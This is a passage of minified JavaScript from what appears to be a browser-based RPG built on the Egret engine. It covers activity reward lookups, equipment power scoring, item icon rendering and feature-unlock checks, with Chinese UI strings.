n=i.options[e],s=i.show[0].reward;if(s)for(var a in s)if(n&&n.itemid&&s[a].id==n.itemid)return s[a]}return null},e.prototype.return70NumByValue=function(t,e){var i=[];for(var n in t){var s=o.GlobalConfig.OptionalGiftConfig[t[n].id];if(s&&s.options){var a=s.options[e[n]],r=s.show[0].reward;if(r)for(var l in r)a&&a.itemid&&r[l].id==a.itemid&&i.push(r[l])}}return i},e.prototype.set71SelectItem=function(t){this.returnAct71Indx={idx:t.idx,lisIdx:t.lisIdx,value:t.value},this.update71PanelAct()},e.prototype.update71PanelAct=function(){},e.prototype.return71DataByValue=function(t,e){var i=o.GlobalConfig.OptionalGiftConfig[t];if(i&&i.options){var n=i.options[e],s=i.show[0].reward;if(s)for(var a in s)if(n&&n.itemid&&s[a].id==n.itemid)return s[a]}return null},e.prototype.return71NumByValue=function(t,e){var i=[];for(var n in t){var s=o.GlobalConfig.OptionalGiftConfig[t[n].id];if(s&&s.options){var a=s.options[e[n]],r=s.show[0].reward;if(r)for(var l in r)a&&a.itemid&&r[l].id==a.itemid&&i.push(r[l])}}return i},e.NotReached=0,e.CanGet=1,e.Geted=2,e.NOKILL=0,e.KILL=1,__decorate([post()],e.prototype,"postOpenServerRankInfoChange",null),__decorate([post()],e.prototype,"postEnvelopeData",null),__decorate([post()],e.prototype,"postRedEnvelopeData",null),__decorate([post()],e.prototype,"postEnvelopeDataCall",null),__decorate([post()],e.prototype,"postGetRedEnvelope",null),__decorate([post()],e.prototype,"postActivityIsGetAwards",null),__decorate([post()],e.prototype,"postRewardResult",null),__decorate([post()],e.prototype,"postActivityPanel",null),__decorate([post()],e.prototype,"postHuntResult",null),__decorate([post()],e.prototype,"postChangePage",null),__decorate([post()],e.prototype,"postSevendayAwardCallback",null),__decorate([post()],e.prototype,"postSevendayIsAwards",null),__decorate([post()],e.prototype,"postKuaFuRank",null),__decorate([post()],e.prototype,"postAddTips52",null),__decorate([post()],e.prototype,"postHuntResultPlayFunc",null),__decorate([post()],e.prototype,"postGetDaBiaoInfo",null),__decorate([post()],e.prototype,"postDownHongBao",null),__decorate([post()],e.prototype,"postHongBaoOpen",null),__decorate([post()],e.prototype,"update70PanelAct",null),__decorate([post()],e.prototype,"update71PanelAct",null),e}(n.BaseSystem);e.Activity=w,window.Activity=w,__reflect(w.prototype,"Activity",[]);var I=function(){function t(){}return t.prototype.prase=function(t,e){if(e==u.RankDataType.TYPE_XIAOFEI||e==u.RankDataType.TYPE_HF_XIAOFEI)return this.rankIndex=t.readShort(),this.id=t.readInt(),this.name=t.readString(),void(this.numType=t.readInt());if(this.rankIndex=t.readShort(),this.id=t.readInt(),this.name=t.readString(),this.level=t.readShort(),this.zsLevel=t.readShort(),this.monthCard=t.readShort(),this.vipLv=t.readShort(),u.RankDataType.TYPE_LEVEL!=e)if(e==u.RankDataType.TYPE_BAOSHI||e==u.RankDataType.TYPE_LONGHUN)this.numType=t.readInt();else if(e==u.RankDataType.TYPE_ZHANLING){var i=t.readInt(),n=t.readInt();this.numType=[i,n]}else this.numType=t.readDouble()},t}();e.DabiaoData=I,window.DabiaoData=I,__reflect(I.prototype,"DabiaoData",[]),Systemap.Activity=function(){return w.ins()},window.Activity=w},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemUtil=void 0;var n=i(22),o=i(34),s=i(0),a=i(39),r=i(48),l=i(31),h=i(13),u=i(24),p=function(){function t(){}return t.calculateBagItemScore=function(e,i){var n;void 0===i&&(i=h.SubRoles.ins().getSubRoleByIndex(0));var o={hp:2,def:5,res:6,atkMin:141,atkMax:142,mageMin:145,mageMax:146,taoistMin:143,taoistMax:144,crit:7,tough:8},a=0,l=0,u=s.GlobalConfig.EquipConfig[null===(n=e.itemConfig)||void 0===n?void 0:n.id],p=s.GlobalConfig.AttrPowerConfig,d=e.att,c=0;if(d)for(var f in o){var g=t.isJobShow(o[f],i.job),m=u&&u[f]?u[f]:0;c=g?m:0;for(var v=0;v<d.length;v++)if(d[v].type==o[f]&&g){c+=d[v].value;break}l+=c*p[o[f]].pow}else if(u)for(var y in o){c=u[y];var g=t.isJobShow(d[y].type,i.job);if(c&&g){var C=r.Role.getAttrTypeByName(y);l+=c*p[C].pow}}u&&u.baseAttr1&&(a+=this.getAttrPower([u.baseAttr1])),u&&u.baseAttr2&&(a+=this.getAttrPower([u.baseAttr2])),u&&u.exPower&&(a+=u.exPower);var T=0;e.extAtt&&0!=e.extAtt.length&&(T+=t.getAttrPower(e.extAtt));var b=0;return e.supExtAtt&&0!=e.supExtAtt.length&&(b+=t.getAttrPower(e.supExtAtt)),Math.floor(l/100)+Math.floor(a)+b+T},t.pointCalNumber=function(e){var i=e.id;if(void 0!=t.itemPoints[i])return t.itemPoints[i];var n={hp:2,atk:4,def:5,res:6},o=s.GlobalConfig.EquipConfig[i],a=s.GlobalConfig.AttrPowerConfig,r=0;for(var h in n){var u=n[h],p=o[h];if(p){var d=a[u];r+=(p+Math.floor(p*l.additionRange/100))*d.pow}}return t.itemPoints[i]=Math.floor(r/100),t.itemPoints[i]},t.isCanAwakeEquip=function(e,i){return void 0===i&&(i=1),e&&s.GlobalConfig.EquipAwakeConf.equipQuality.indexOf(i)>-1&&s.GlobalConfig.EquipAwakeConf.equipType.indexOf(t.getType(e))>-1&&s.GlobalConfig.EquipAwakeConf.equipSubType.indexOf(t.getSubType(e))>-1},t.pointCalAwakeNumber=function(e,i,n){if(void 0===n&&(n=!0),!e)return 0;var o=e.id,a={hp:2,atk:4,def:5,res:6},r=(t.getSubType(s.GlobalConfig.ItemConfig[o]),s.GlobalConfig.EquipConfig[o]),l=s.GlobalConfig.AttrPowerConfig,h=0;for(var u in a){var p=a[u],d=r[u];if(d){l[p]}}return Math.floor(h/100)},t.getAttrData=function(t,e){void 0===e&&(e=0);var i=s.GlobalConfig.EquipConfig[t.id],a={hp:2,atk:4,atkMin:141,atkMax:142,mageMin:145,mageMax:146,taoistMin:143,taoistMax:144,def:5,res:6},r=[o.AttributeType.atHolyDamege],l=[];if(0==e||1==e)for(var h in a)i[h]&&l.push(new n.AttributeData(a[h],i[h]));return(0==e||2==e)&&(i.baseAttr1&&r.indexOf(i.baseAttr1.type)>=0&&l.push(new n.AttributeData(i.baseAttr1.type,i.baseAttr1.value)),i.baseAttr2&&r.indexOf(i.baseAttr2.type)>=0&&l.push(new n.AttributeData(i.baseAttr2.type,i.baseAttr2.value))),l},t.relatePower=function(t,e){var i=0,o=s.GlobalConfig.AttrPowerConfig,a=o[t.type];if(a&&a.relate_type){var r=e.getAtt(a.relate_type),l=n.AttributeData.exRelate[a.relate_type];if(l){var h=e.getAtt(l);h&&(r=Math.floor(r/(1+h/1e4)))}i+=Math.floor(t.value*r*a.relate_power/100)}return i},t.getQuality2=function(t){return t&&s.GlobalConfig.ItemDescConfig[t.descIndex]&&s.GlobalConfig.ItemDescConfig[t.descIndex].quality>=0?s.GlobalConfig.ItemDescConfig[t.descIndex].quality:0},t.getEffName=function(t,e){var i,n,o,a="";if(!t)return a;var r=s.GlobalConfig.ItemDescConfig[t.descIndex];if(r){var l=e?e:r.quality;a=(null===(o=null===(n=null===(i=s.GlobalConfig.ItemEffConfig[r.type])||void 0===i?void 0:i[l])||void 0===n?void 0:n[r.subType])||void 0===o?void 0:o.name)||""}return a},t.getDropEffName=function(t,e){var i,n,o,a="";if(!t)return a;var r=s.GlobalConfig.ItemDescConfig[t.descIndex];return r&&(a=(null===(o=null===(n=null===(i=s.GlobalConfig.ItemEffConfig[r.type])||void 0===i?void 0:i[e])||void 0===n?void 0:n[r.subType])||void 0===o?void 0:o.dropEff)||""),a},t.getQualityColor=function(t){return l.QUALITY_COLOR[t]||0},t.getQualityColor2=function(t){return l.QUALITY_COLOR[this.getQuality(t)]},t.getQuality=function(t){return t&&s.GlobalConfig.ItemDescConfig[t.descIndex]?s.GlobalConfig.ItemDescConfig[t.descIndex].quality:0},t.getType=function(t){return t&&s.GlobalConfig.ItemDescConfig[t.descIndex]?s.GlobalConfig.ItemDescConfig[t.descIndex].type:0},t.getIcon=function(t){return t?t.icon:null},t.getItemSource=function(e){if("number"==typeof e)return RES_DIR_ITEMICON+e+".png";if(!e)return"";var i=t.getIcon(e);return i?RES_DIR_ITEMICON+i+".png":""},t.getSubType=function(t){return t&&s.GlobalConfig.ItemDescConfig[t.descIndex]?s.GlobalConfig.ItemDescConfig[t.descIndex].subType:0},t.getStage=function(t){return(null===t||void 0===t?void 0:t.stage)||0},t.getPosList=function(t){return t&&s.GlobalConfig.ItemDescConfig[t.descIndex]?s.GlobalConfig.ItemDescConfig[t.descIndex].posList:[]},t.getJob=function(t){return t&&s.GlobalConfig.ItemDescConfig[t.descIndex]?s.GlobalConfig.ItemDescConfig[t.descIndex].job:0},t.isEquip=function(t){var e=this.getType(t);switch(e){case a.ItemType.TYPE_0:case a.ItemType.TYPE_4:case a.ItemType.TYPE_11:case a.ItemType.TYPE_26:case a.ItemType.TYPE_51:return!0}return!1},t.isMasterEquip=function(t){var e=this.getType(t);return e==a.ItemType.TYPE_33},t.getFmStata=function(t){for(var e=[],i=0;4>i;i++){var n=t.extAtt[1].value>>i&1;e.push(n)}return e},t.getFmCount=function(t){for(var e=0,i=0;4>i;i++)(t.extAtt[1].value>>i&1)>0&&e++;return e},t.getAttrPower=function(e,i){void 0===i&&(i=h.SubRoles.ins().getSubRoleByIndex(0));var n=s.GlobalConfig.AttrPowerConfig,a=0;if(!e)return a;for(var r=0,l=0;l<e.length;l++){var u=e[l].type,p=e[l].value;if(u!=o.AttributeType.atHpEx&&u!=o.AttributeType.atAtkEx&&u!=o.AttributeType.atDamageReduction&&n[u]&&p){var d=t.isJobShow(u,i.job);d&&(a+=p*n[u].pow,u==o.AttributeType.atHuiXinDamage&&i&&(r+=t.relatePower(e[l],i)))}}return Math.floor(a/100)+Math.floor(r)},t.isJobShow=function(t,e){switch(t){case o.AttributeType.atAtkMin:case o.AttributeType.atAtkMax:return 1==e||4==e||5==e;case o.AttributeType.atAtkTaoistMin:case o.AttributeType.atAtkTaoistMax:return 3==e;case o.AttributeType.atAtkMageMin:case o.AttributeType.atAtkMageMax:return 2==e;default:return!0}},t.getAttrsDataBy=function(t,e){void 0===e&&(e=h.SubRoles.ins().getSubRoleByIndex(0));var i=s.GlobalConfig.EquipConfig[t],o=u.CommonUtils.objectToArray(i.fixedAffixAttr);o.sort(function(t,e){return t[0]-e[0]});var a=[],r=[];for(var l in o){var p=o[l],d=new n.AttributeData;d.type=p[0],d.value=p[1];var c=p[2];a.push(d),r.push(c)}var f=n.AttributeData.getAttrShowStr(a,": ",r);return f},t.getRewardLen=function(t){for(var e=0,i=0;i<t.length;i++){var n=t[i];0!=n.type&&e++}return e},t.itemCanUp=function(e,i){var n=this.getEquipAttrs(e),o=e.point?e.point:t.getAttrPower(n);if(!i){var s=h.SubRoles.ins().getSubRoleByIndex(0),a=e.itemConfig,r=t.getSubType(a),l=u.CommonUtils.copyDataHandler(t.getPosList(a)||[]);-1==l.indexOf(r)&&l.push(r);for(var p=0;p<l.length;p++){var d=l[p],c=s.getEquipByIndex(d);if(!(c&&c.item&&c.item.itemConfig))return!0;var f=this.getEquipAttrs(c.item),g=c.item.point?c.item.point:t.getAttrPower(f);if(o>g)return!0}return!1}var m=this.getEquipAttrs(i),g=t.getAttrPower(m);return o>g?!0:void 0},t.getEquipAttrs=function(t){var e=s.GlobalConfig.EquipConfig[t.configID],i=[];for(var o in r.Role.translate)if(e&&!(e[o]<0)){var a=t.att,l=new n.AttributeData;if(void 0!=e[o]&&(l.type=r.Role.getAttrTypeByName(o),l.value=e[o]),a)for(var h=0;h<a.length;h++)if(a[h].type==r.Role.getAttrTypeByName(o)){l.value+=a[h].value;break}l&&i.push(l)}return i},t.getPosName=function(t){var e=[gettext("武器"),gettext("头盔"),gettext("衣服"),gettext("项链"),gettext("护腕"),gettext("腰带"),gettext("戒指"),gettext("鞋子"),gettext("护腕"),gettext("戒指"),gettext("护肩"),gettext("面甲"),gettext("披风"),gettext("盾牌"),gettext("特戒"),gettext("特戒"),gettext("特戒"),gettext("特戒"),gettext("勋章"),gettext("玉佩"),gettext("神盾"),gettext("秘录"),gettext("子鼠"),gettext("丑牛"),gettext("寅虎"),gettext("卯兔"),gettext("辰龙"),gettext("巳蛇"),gettext("午马"),gettext("未羊"),gettext("申猴"),gettext("酉鸡"),gettext("戌狗"),gettext("亥猪")];return e[t]},t.getMasterPosName=function(t){switch(t){case 0:return gettext("主宰护肩");case 1:return gettext("主宰面甲");case 2:return gettext("主宰披风");case 3:return gettext("主宰盾牌")}return""},t.itemPoints={},t}();e.ItemUtil=p,window.ItemUtil=p,__reflect(p.prototype,"ItemUtil",[]),window.ItemUtil=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemBase=void 0;var n=i(16),o=i(5),s=i(3),a=i(0),r=i(39),l=i(36),h=i(30),u=i(6),p=i(40),d=i(10),c=i(184),f=i(161),g=i(31),m=i(217),v=i(185),y=i(13),C=i(4),T=i(324),b=i(24),w=i(230),I=i(80),_=i(325),S=i(692),x=i(693),D=function(t){function e(){var e=t.call(this)||this;return e.showSpeicalDetail=!0,e.isOpenSelectImg=!1,e.isCurrency=!1,e.showName=!1,e.countShow=!0,e.showExtreme=!1,e.isShowRed=!1,e.setQ=0,e.sStr="",e._sn_="ItemSkin",e._tag="",e.init(),e}return __extends(e,t),e.prototype.destroy=function(){},e.prototype.init=function(){this.addEventListener(egret.TouchEvent.TOUCH_END,this.onClick,this)},e.prototype.skinComplete=function(){this.str.text=this.sStr||"",this.count.text="",this.nameTxt.wordWrap=getLangType()==LanguageEnum.AR?!0:!1,this.setTag(this._tag),this.setItemImg(this._iconStr),this.showNum(this.countShow),this.isShowExtreme(this.showExtreme),this._heirloomDic&&this.setItemHeirloomBgImg(this._heirloomDic.show,this._heirloomDic.path),!!this.countstr&&this.setCount(this.countstr),"string"==typeof this.imgBg2Str&&this.setImgBg2(this.imgBg2Str),"string"==typeof this.imgEff2Str&&this.setItemEff2(this.imgEff2Str),this.isClearEff&&this.clearEffect(),this.EquipEffect.touchEnabled=!1,this.EquipEffect.visible=!1,this["double"].visible=!1,this.iconName&&this.setName(this.iconName)},e.prototype.setTag=function(t){this._tag=t,this.itemIcon&&this.itemIcon.setTag(t)},e.prototype.setItemImg=function(t){this._iconStr=t,this.itemIcon&&this.itemIcon.setIcon(t)},e.prototype.clearIcon=function(){this._iconStr="",this.itemIcon&&this.itemIcon.imgIcon&&(this.itemIcon.imgIcon.source="")},e.prototype.clearTiSheng=function(){this.itemIcon&&this.itemIcon.tisheng&&(this.itemIcon.tisheng.visible=!1,egret.Tween.removeTweens(this.itemIcon.tisheng))},e.prototype.setItemHeirloomBgImg=function(t,e){!this._heirloomDic&&(this._heirloomDic={}),this._heirloomDic.show=t,this._heirloomDic.path=e,this.itemIcon&&this.itemIcon.setItemHeirloomBgImg(t,e)},e.prototype.setDataByConfig=function(t,e){var i,n;if(!t)return void platform.reportError("setDataByConfig:"+this.data);var o=d.ItemUtil.getQuality2(t)>0?d.ItemUtil.getQuality2(t):(null===(i=this.data)||void 0===i?void 0:i.quality)||(null===(n=this.data)||void 0===n?void 0:n.qx)||0;0>o&&(o=0);var s=null;if(this.data instanceof p.ItemData)s=this.data;else if(this.data instanceof T.TreasureItemData){var l=new p.ItemData;l.treasureData=this.data,s=l}if(this.itemIcon&&"function"==typeof this.itemIcon.setData&&(this.itemIcon.setData(t,s),this.data instanceof m.RandomItemData&&this.itemIcon.setImgBg2("quality"+o)),this.iconName)this.setName(this.iconName);else if(this.nameTxt.textColor=g.QUALITY_COLOR[o],this.data instanceof p.ItemData&&d.ItemUtil.getType(this.itemConfig)==r.ItemType.TYPE_55){var h=this.data.getGemLv();this.nameTxt.textColor=g.QUALITY_COLOR[h],this.nameTxt.text=e?this.getGemPreName()+e:this.getGemPreName()+this.data.getGemName()}else if(s&&s.treasureData&&d.ItemUtil.getType(this.itemConfig)==r.ItemType.TYPE_55){var h=s.treasureData.gemQlt;this.nameTxt.textColor=g.QUALITY_COLOR[h];var u=h?a.GlobalConfig.GemUpdateConfig[h].lvName:"",c=a.GlobalConfig.GemPrefixConfig[s.treasureData.gemId].name;this.nameTxt.text=e?u+e:u+c}else this.nameTxt.text=e?e:t.name;void 0!=this.num&&this.setCount(this.num+""),this.itemIcon.showIconEffect(),this.itemIcon.updateImgJob()},e.prototype.getCoolDown=function(){var t=0;this.data&&(t=u.BagCT.ins().isCoolDown(this.data.configID)),0>=t&&Timer.stop(this.getCoolDown,this)},e.prototype.dataChanged=function(){this.clear();var t=!1;if(this.redPoint.visible=!1,this.setTag(""),this.setLock(!1),this.data){if(isNaN(this.data))if(this.data instanceof p.ItemData){if((this.data.isMyEquip(u.BagCT.BAG_TYPE_EQUIP)||this.data.isMyEquip(u.BagCT.BAG_TYPE_STORE)||d.ItemUtil.isMasterEquip(this.data.itemConfig))&&this.setLock(this.data.lock?!0:!1),this.itemConfig=this.data.itemConfig,!this.itemConfig)return;this.setDataByConfig(this.itemConfig),this.data.count>1?this.setCount(this.data.count+""):this.setCount(""),!isNaN(this.itemConfig.level)&&C.ActorCC.level>=this.itemConfig.level&&144==this.itemConfig.descIndex&&(this.redPoint.visible=!0)}else if(this.data instanceof m.RandomItemData){if(this.itemConfig=a.GlobalConfig.ItemConfig[this.data.id],!this.itemConfig)return;this.setDataByConfig(this.itemConfig);var e=this.data.count;e>1?this.setCount(e+""):this.setCount("")}else if(this.data instanceof T.TreasureItemData){if(this.itemConfig=a.GlobalConfig.ItemConfig[this.data.id],!this.itemConfig)return;this.setDataByConfig(this.itemConfig)}else{if(0==this.data.type){this.itemIcon.setIcon(h.RewardData.getCurrencyRes(this.data.id)),this.isCurrency=!0,this.itemConfig=a.GlobalConfig.ItemConfig[this.data];var i=d.ItemUtil.getQuality2(this.itemConfig);this.itemIcon.setImgBg2("quality"+i),this.iconName?this.setName(this.iconName):(this.nameTxt.text=h.RewardData.getCurrencyName(this.data.id),this.nameTxt.textColor=g.QUALITY_COLOR[i]);var e=this.data.count;void 0!=e&&e>1?this.setCount(e+""):this.setCount("")}else if(1==this.data.type){if(this.itemConfig=a.GlobalConfig.ItemConfig[this.data.id],!this.itemConfig)return;this.setDataByConfig(this.itemConfig);var e=this.data.count;e>1?this.setCount(e+""):this.setCount(""),void 0!=this.data.qx&&this.data.qx>=0&&this.itemIcon.setImgBg2("quality"+this.data.qx)
}else if(6==this.data.type){this.itemConfig=a.GlobalConfig.ItemConfig[this.data.id],this.setDataByConfig(this.itemConfig);var e=this.data.count;void 0!=e&&e>1?this.setCount(e+""):this.setCount("")}this.redPoint.visible=1==this.data.isRedPoint,this.getImg.visible=2==this.data.isRedPoint}else this.itemConfig=a.GlobalConfig.ItemConfig[this.data],this.setDataByConfig(this.itemConfig,this.runeName);if(this.redPoint.visible||(this.redPoint.visible=this.data.canbeUsed),this.showEquipEffect(),t&&this.itemConfig&&(d.ItemUtil.getType(this.itemConfig)==r.ItemType.TYPE_17?this.redPoint.visible=!0:d.ItemUtil.getType(this.itemConfig)==r.ItemType.TYPE_35&&(this.redPoint.visible=!0)),d.ItemUtil.getType(this.itemConfig)==r.ItemType.TYPE_56&&this.isShowRed){var n=I.TotemCT.ins().checkTotemJob(this.itemConfig.id);n&&(I.TotemCT.ins().checkIsWear(this.itemConfig.id)&&I.TotemCT.ins().returnIsWearSmallerType(this.itemConfig.id)?I.TotemCT.ins().returnIsLowerQualityComItem(this.itemConfig.id)||(this.redPoint.visible=!0):this.redPoint.visible=!0)}this.setSelect(this.selected),this.dataChangeHandler()}},e.prototype.dataChangeHandler=function(){},e.prototype.clear=function(){if(this.alpha=1,this.skin){this.itemConfig=null,this.itemIcon&&"function"==typeof this.itemIcon.setData&&this.itemIcon.setData(null),this.count.text="",this.nameTxt.text="",this.nameTxt.textColor=14668213,this.EquipEffect&&this.EquipEffect.removeDisplay();for(var t=0;4>t;t++)this["yjIcon"+t]&&(this["yjIcon"+t].visible=!1)}},e.prototype.destruct=function(){this.removeEventListener(egret.TouchEvent.TOUCH_END,this.onClick,this)},e.prototype.onClick=function(t){this.data&&1==this.data.isRedPoint||t.target instanceof e||(this.showCurrency(),this.showDetail())},e.prototype.getItemType=function(){return this.itemConfig?d.ItemUtil.getType(this.itemConfig):-1},e.prototype.showCurrency=function(){if(this.isCurrency)switch(this.data.id){case l.MoneyConst.yuanbao:win.open("ItemCurrencyWin",this.data.id,this.data.count)}},e.prototype.showDetail=function(){if(this.itemConfig){if(a.GlobalConfig.ItemRechargeConfig[this.itemConfig.id])return void(this.data.handle?win.open("ItemRechargeTipWin",this.data):win.open("ItemDetailedWin",0,this.itemConfig.id));switch(d.ItemUtil.getType(this.itemConfig)){case r.ItemType.TYPE_0:case r.ItemType.TYPE_4:case r.ItemType.TYPE_26:case r.ItemType.TYPE_33:this.openEquipsTips();break;case r.ItemType.TYPE_30:win.open(S.WushuangEquipDelWin,this.data,this.itemConfig.id);break;case r.ItemType.TYPE_58:win.open(x.TunTianEquipTipsWin,this.data,this.itemConfig.id);break;case r.ItemType.TYPE_1:this.data.handle&&a.GlobalConfig.ItemComposeConfig[this.itemConfig.id]&&!a.GlobalConfig.ItemComposeConfig[this.itemConfig.id].dropId?win.open("ItemUseTipsWin",this.data):f.Dress.ins().isZhuangBanItem(this.itemConfig.id)?win.open("DressTipsWin",this.itemConfig,null!=this.data.handle):win.open("ItemDetailedWin",0,this.itemConfig.id,this.data.count);break;case r.ItemType.TYPE_11:var t=a.GlobalConfig.HeirloomEquipFireConfig,e=0;for(var i in t)if(t[i].expend.id==this.itemConfig.id){e=t[i].slot;break}e&&win.open("HeirloomEquipTipsWin",null,e-1,1);break;case r.ItemType.TYPE_35:win.open("TitleTipsWin",this.data);break;case r.ItemType.TYPE_2:this.data.handle?win.open("ItemUseTipsWin",this.data):this.data.count?win.open("ItemDetailedWin",0,this.itemConfig.id,this.data.count):win.open("ItemDetailedWin",0,this.itemConfig.id);break;case r.ItemType.TYPE_6:win.open("RuneTipsWin",0,this.itemConfig.id,this.desc,this.desc2);break;case r.ItemType.TYPE_17:this.showSpeicalDetail=!1;for(var n=this.parent;n&&n.parent;)if(n=n.parent,n instanceof v.BagWin){this.showSpeicalDetail=!0;break}win.open(this.showSpeicalDetail?"TreasureChuanshiGiftWin":"ItemDetailedWin",0,this.itemConfig.id,this.data.count);break;case r.ItemType.TYPE_19:win.open("ExtremeEquipTipsWin",this.data);break;case r.ItemType.TYPE_8:case r.ItemType.TYPE_47:case r.ItemType.TYPE_48:case r.ItemType.TYPE_10:case r.ItemType.TYPE_27:case r.ItemType.TYPE_65:this.data.handle?win.open("ItemUseTipsWin",this.data):win.open("ItemDetailedWin",0,this.itemConfig.id,this.data.count);break;case r.ItemType.TYPE_53:this.data.handle?win.open("ItemJulingTip",this.data):win.open("ItemDetailedWin",0,this.itemConfig.id);break;case r.ItemType.TYPE_55:win.open("EquipInlayTipsWin",this.data);break;case r.ItemType.TYPE_56:win.open(w.TotemDetailedItem,this.data,0);break;case r.ItemType.TYPE_57:win.open(_.ItemUseTipsWin,this.data,this.data.handle>0?!1:!0);break;case r.ItemType.TYPE_16:if(this.data.itemConfig){var o=a.GlobalConfig.GodWingItemConfig[this.data.itemConfig.id];win.open("GodWingEquipTipsWin",o,this.data.handle)}else{var o=a.GlobalConfig.GodWingItemConfig[this.data.id];win.open("GodWingEquipTipsWin",o,0)}break;case r.ItemType.TYPE_60:var s=this.data.handle?this.data.endTime:0;win.open("ItemDetailedWin",0,this.itemConfig.id,this.data.count,s);break;default:win.open("ItemDetailedWin",0,this.itemConfig.id)}}},e.prototype.setCount=function(t){this.countstr=t;var e=getLangType();if(e==LanguageEnum.CN||e==LanguageEnum.CN1){if(t.length>4){var i=Math.floor(Number(t)/1e3);t=i/10+gettext("万")}}else""!=t&&(t=b.CommonUtils.overLength(+t,4));this.count&&(this.count.text=t)},e.prototype.openEquipsTips=function(){var t,e;if(a.GlobalConfig.HotBloodAwakeConf.legendEquip.indexOf(this.itemConfig.id)>-1){for(var i=this.parent;i&&i.parent;)if(i=i.parent,i instanceof c.BagPanel)return void win.open("EquipDetailedWin",1,this.data.handle,this.itemConfig.id,this.data,null,-1,null);win.open("LegendTipsWin",this.itemConfig.id,this.data)}else{var n=y.SubRoles.ins().getSubRoleByIndex(0);if(!n)return;for(var o=n.equipsData,s=null,r=-1,l=null,h=0;h<o.length;h++)if((null===(t=o[h].item)||void 0===t?void 0:t.handle)&&(null===(e=o[h].item)||void 0===e?void 0:e.handle)==this.data.handle){s=n,r=n.index,l=h;break}win.open("EquipDetailedWin",1,this.data.handle,this.itemConfig.id,this.data,s,r,l)}},e.prototype.isShowName=function(t){this.nameTxt&&(this.nameTxt.visible=t)},e.prototype.getItemSoure=function(){var t="";return t=0==this.data.type?h.RewardData.getCurrencyRes(this.data.id):d.ItemUtil.getItemSource(this.itemIcon.config)},e.prototype.getText=function(){return this.nameTxt.text},e.prototype.getTextColor=function(){return this.nameTxt.textColor},e.prototype.setTextColor=function(t){this.nameTxt&&(this.nameTxt.textColor=d.ItemUtil.getQualityColor(t))},e.prototype.showEquipEffect=function(){var t;if(!this.isClearEff&&(this.itemConfig||this.data.id==l.MoneyConst.yuanbao)){this.EquipEffect.visible=!0;var e=d.ItemUtil.getQuality2(this.itemConfig)>0?d.ItemUtil.getQuality2(this.itemConfig):(null===(t=this.data)||void 0===t?void 0:t.quality)||0,i=d.ItemUtil.getEffName(this.itemConfig,e);this.EquipEffect.touchEnabled=!1,this.addChildAt(this.EquipEffect,this.getChildIndex(this)),this.addChildAt(this.nameTxt,this.getChildIndex(this.EquipEffect)+1),""!=i?this.EquipEffect.data=RES_DIR_EFF+i:n.DisplayUtils.removeFromParent(this.EquipEffect)}},e.prototype.clearEffect=function(){this.isClearEff=!0,this.EquipEffect&&(n.DisplayUtils.removeFromParent(this.EquipEffect),this.EquipEffect=null)},e.prototype.showNum=function(t){this.countShow=t,this.skin&&(this.count.visible=t)},e.prototype.setStr=function(t){this.sStr=t||"",this.skin&&(this.str.text=t)},e.prototype.setImgBg=function(t){var e;this.skin&&(this.setQ=t,(null===(e=this.itemIcon)||void 0===e?void 0:e.imgBg)&&(this.itemIcon.imgBg.source="quality"+this.setQ))},e.prototype.getItemIcon=function(){return this.itemIcon},e.prototype.setSelect=function(t){this.isOpenSelectImg&&(this.selectFrame.visible=t)},e.prototype.hideName=function(){this.nameTxt.visible=!1},e.prototype.setName=function(t){this.iconName=t,this.nameTxt&&(this.nameTxt.textFlow=o.TextFlowMaker.generateTextFlow1(this.getGemPreName()+t))},e.prototype.setRedPoint=function(t){this.redPoint&&(this.redPoint.visible=t)},e.prototype.setGetImg=function(t){this.getImg.visible=t},e.prototype.setLock=function(t){this.lock.visible=t},e.prototype.setImgBg2=function(t){this.imgBg2Str=t,this.itemIcon&&this.itemIcon.setImgBg2(t)},e.prototype.setItemEff2=function(t){this.imgEff2Str=t,this.itemIcon&&this.itemIcon.setItemEff2(t)},e.prototype.clearAll=function(){this.clear()},e.prototype.isShowExtreme=function(t){this.showExtreme=t,this.itemIcon&&this.itemIcon.isShowExtreme(t)},e.prototype.getGemPreName=function(){var t="";if(this.data instanceof p.ItemData&&d.ItemUtil.getType(this.itemConfig)==r.ItemType.TYPE_55){var e=this.data.getGemLv();t=e?a.GlobalConfig.GemUpdateConfig[e].lvName:""}return t},e}(s.BaseItemRender);e.ItemBase=D,window.ItemBase=D,__reflect(D.prototype,"ItemBase",["IPoolElement"]),window.ItemBase=D},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OpenSystem=void 0;var n=i(14),o=i(0),s=i(4),a=i(7),r=i(26),l=i(13),h=i(42),u=i(25),p=i(23),d=function(t){function e(){var e=t.call(this)||this;return e.sysOpenList=[],e.checkCloseSrvIDDic={},e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initLogin=function(){observe(this,this.patchNewFunOpen,a.GameServerCC.postServerOpenDay),observe(this,this.patchNewFunOpen,s.ActorCC.postLevelChange),observe(this,this.patchNewFunOpen,s.ActorCC.postPowerChange),observe(this,this.patchNewFunOpen,r.ZsCT.ins().postZsLv),observe(this,this.patchNewFunOpen,u.Recharge.ins().onNewSvipInfo)},e.prototype.checkSysOpen=function(t){var e=o.GlobalConfig.OpenSystemConfig[t];if(!e)return!1;var i,n=e.than,h=e.openzs,d=e.openlevel,c=e.openDay,f=e.power,g=e.appType,m=e.appTypeNoShow,v=(e.recharge,e.wxgame),y=e.hefu,C=e.closeSrvId,T=e.jingmai,b=e.closelevel,w=e.openyb,I=e.appId,_=e.appIdNoShow,S=s.ActorCC.level;if(C){if(!this.checkCloseSrvIDDic[t]){this.checkCloseSrvIDDic[t]=[];var x=C.replace("{",""),D=x.replace("}","");if(D){var A=D.split(",");if(A&&A.length>0){i=[];for(var k=0;k<A.length;k++){var B=A[k].split("-");if(B)if(1==B.length)i.push(Number(B[0]));else if(2==B.length)for(var P=Number(B[0]),R=Number(B[1]),E=P;R>=E;E++)this.checkCloseSrvIDDic[t].push(E)}}}}i=this.checkCloseSrvIDDic[t].slice(0)}if(!urlParam.debugTS&&I&&-1==I.indexOf(urlParam.appid))return!1;if(!urlParam.debugTS&&_&&-1!=_.indexOf(urlParam.appid))return!1;if(!urlParam.debugTS&&i&&-1!=i.indexOf(+urlParam.srvid))return!1;if(!urlParam.debugTS&&g&&-1==g.indexOf(urlParam.apptype))return!1;if(!urlParam.debugTS&&m&&-1!=m.indexOf(urlParam.apptype))return!1;if(urlParam.isWXiOS){var 